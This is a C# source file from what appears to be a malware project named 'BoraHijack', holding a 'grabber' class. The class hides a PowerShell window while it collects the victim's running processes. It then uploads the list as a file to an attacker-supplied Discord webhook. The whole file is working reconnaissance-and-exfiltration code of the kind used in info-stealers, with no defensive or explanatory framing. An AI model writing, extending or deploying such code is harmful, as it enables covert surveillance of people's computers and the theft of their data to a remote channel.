using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Discord;
using Discord.Webhook;
using System.IO;
using System.Diagnostics;

namespace BoraHijack.Grabbers
{
    class ProcessInfo
    {
        public async static Task MainGrabProcess(string webhookUrl)
        {
            string processInfo = GetProcessList();

            // Save to memory
            var ms = new MemoryStream();
            var writer = new StreamWriter(ms);
            writer.Write(processInfo);
            writer.Flush();
            ms.Position = 0;

            var client = new DiscordWebhookClient(webhookUrl);

            await client.SendFileAsync(
                ms,
                filename: "ProcessList.txt",
                text: "Current Process List",
                isTTS: false,
                embeds: null,
                username: "BoraHijack",
                avatarUrl: "https://files.catbox.moe/zteeqk.png"
            );
        }

        private static string GetProcessList()
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 | Out-String",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            // prevents resource leaks
            using (var process = Process.Start(psi))
            {
                if (process == null)
                {
                    return "PS false";
                }

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return output;
            }
        }
    }
}
